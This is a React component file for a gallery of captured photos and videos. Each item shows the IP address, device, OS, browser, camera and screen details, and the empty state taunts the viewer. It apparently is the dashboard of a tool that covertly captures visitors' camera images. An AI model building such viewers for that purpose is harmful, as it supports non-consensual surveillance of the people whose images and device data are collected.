import React, { useState, useEffect, useRef } from 'react';
import styles from './styles.module.css';

const SystemInfoDisplay = ({ photo }) => {
    const systemInfo = photo.systemInfo || {};
    const systemData = systemInfo.systemData || {};
    
    const infoItems = [
        { label: 'IP', value: systemInfo.ip || 'Unknown' },
        { label: 'Device', value: systemData.deviceType || 'Unknown' },
        { label: 'OS', value: systemData.operatingSystem || 'Unknown' },
        { label: 'Browser', value: systemData.browser || 'Unknown' },
        { label: 'Camera', value: systemData.camera || 'Unknown' },
        { label: 'Screen', value: systemData.screenResolution || 'Unknown' },
        { label: 'Media Type', value: systemInfo.mediaType || photo.type || 'Unknown' }
    ];
    
    return (
        <div className={styles.systemInfo}>
            {infoItems.map(({ label, value }, index) => (
                <div key={index} className={styles.infoRow}>
                    <span>{label}:</span> {value}
                </div>
            ))}
        </div>
    );
};

const MediaLoadingWrapper = ({ children, isLoading, hasError }) => {
    return (
        <>
            {isLoading && <div className={styles.loadingSpinner} />}
            {children}
            {hasError && <div className={styles.mediaError}>Media unavailable</div>}
        </>
    );
};

const CameraGallery = ({ visible, onClose, photos }) => {
    const [modalPhoto, setModalPhoto] = useState(null);
    const galleryRef = useRef(null);
    const updateInterval = useRef(null);

    useEffect(() => {
        if (visible) {
            document.body.style.overflow = 'hidden';

        } else {
            document.body.style.overflow = 'auto';
            if (updateInterval.current) {
                clearInterval(updateInterval.current);
                updateInterval.current = null;
            }
        }

        return () => {
            document.body.style.overflow = 'auto';
            if (updateInterval.current) {
                clearInterval(updateInterval.current);
                updateInterval.current = null;
            }
        };
    }, [visible]);

    const handleItemClick = (photo) => {
        setModalPhoto(photo);
    };

    const handleModalClose = () => {
        setModalPhoto(null);
    };

    const handleBackdropClick = (e) => {
        if (e.target === e.currentTarget) {
            onClose();
        }
    };

    if (!visible) return null;

    return (
        <>
            {/* Gallery Modal */}
            <div className={styles.galleryModal} onClick={handleBackdropClick}>
                <div className={styles.galleryContent}>
                    <span className={styles.galleryClose} onClick={onClose}>
                        &times;
                    </span>
                    <div className={styles.galleryGrid} ref={galleryRef}>
                        {photos.length === 0 ? (
                            <div className={styles.noPhotos}>No photos yet, dickhead!</div>
                        ) : (
                            photos.map((photo, index) => (
                                <GalleryItem 
                                    key={`${photo.url}-${index}`} 
                                    photo={photo} 
                                    onClick={() => handleItemClick(photo)} 
                                />
                            ))
                        )}
                    </div>
                </div>
            </div>

            {/* Photo Modal */}
            {modalPhoto && (
                <PhotoModal photo={modalPhoto} onClose={handleModalClose} />
            )}
        </>
    );
};

const GalleryItem = ({ photo, onClick }) => {
    const [isLoading, setIsLoading] = useState(true);
    const [hasError, setHasError] = useState(false);
    const videoRef = useRef(null);
    const observerRef = useRef(null);

    useEffect(() => {
        if (photo.type === 'video' && videoRef.current) {
            const video = videoRef.current;
            
            // Intersection Observer for video autoplay
            observerRef.current = new IntersectionObserver((entries) => {
                entries.forEach(entry => {
                    if (entry.isIntersecting) {
                        if (video.readyState >= 2) {
                            video.play()
                                .then(() => {
                                    setIsLoading(false);
                                    console.log(`Video playback started: ${photo.url}`);
                                })
                                .catch(error => {
                                    console.error(`Video autoplay failed: ${photo.url}`, error);
                                    setHasError(true);
                                    setIsLoading(false);
                                });
                        }
                    } else {
                        if (!video.paused) {
                            video.pause();
                            console.log(`Video paused: ${photo.url}`);
                        }
                    }
                });
            }, {
                threshold: 0.8,
                rootMargin: '0px'
            });

            observerRef.current.observe(video);

            return () => {
                if (observerRef.current) {
                    observerRef.current.disconnect();
                }
                if (video) {
                    video.pause();
                    video.src = '';
                    video.load();
                }
            };
        }
    }, [photo.type, photo.url]);

    const handleMediaLoad = () => {
        setIsLoading(false);
    };

    const handleMediaError = () => {
        setIsLoading(false);
        setHasError(true);
    };

    return (
        <div className={styles.galleryItem} onClick={onClick}>
            {photo.type === 'video' ? (
                <div className={`${styles.videoContainer} ${isLoading ? styles.loading : ''}`}>
                    <MediaLoadingWrapper isLoading={isLoading} hasError={hasError}>
                        <div className={styles.playButton}>▶</div>
                        <video
                            ref={videoRef}
                            className={styles.galleryVideo}
                            src={photo.url}
                            muted
                            playsInline
                            loop
                            poster={photo.thumbnail}
                            onLoadedData={handleMediaLoad}
                            onError={handleMediaError}
                        />
                    </MediaLoadingWrapper>
                </div>
            ) : (
                <div className={styles.imageContainer}>
                    <MediaLoadingWrapper isLoading={isLoading} hasError={hasError}>
                        <img
                            src={photo.url}
                            alt="Gallery media"
                            loading="lazy"
                            onLoad={handleMediaLoad}
                            onError={handleMediaError}
                        />
                    </MediaLoadingWrapper>
                </div>
            )}
            
            <div className={styles.galleryInfo}>
                <div className={styles.galleryTimestamp}>
                    {new Date(photo.systemInfo?.timestamp || Date.now()).toLocaleString()}
                </div>
                <SystemInfoDisplay photo={photo} />
            </div>
        </div>
    );
};

const PhotoModal = ({ photo, onClose }) => {
    const handleBackdropClick = (e) => {
        if (e.target === e.currentTarget) {
            onClose();
        }
    };

    useEffect(() => {
        document.body.style.overflow = 'hidden';
        return () => {
            document.body.style.overflow = 'auto';
        };
    }, []);

    return (
        <div className={styles.photoModal} onClick={handleBackdropClick}>
            <div className={styles.photoModalContent}>
                <span className={styles.photoClose} onClick={onClose}>
                    &times;
                </span>
                {photo.type === 'video' ? (
                    <video
                        src={photo.url}
                        controls
                        playsInline
                        style={{
                            maxWidth: '100%',
                            maxHeight: '80vh',
                            margin: 'auto',
                            display: 'block'
                        }}
                    />
                ) : (
                    <img
                        src={photo.url}
                        alt="Full size media"
                        style={{
                            maxWidth: '100%',
                            maxHeight: '80vh',
                            margin: 'auto',
                            display: 'block'
                        }}
                    />
                )}
                
                <div className={styles.modalInfo}>
                    <div className={styles.galleryTimestamp}>
                        {new Date(photo.systemInfo?.timestamp || Date.now()).toLocaleString()}
                    </div>
                    <SystemInfoDisplay photo={photo} />
                </div>
            </div>
        </div>
    );
};

export default CameraGallery;
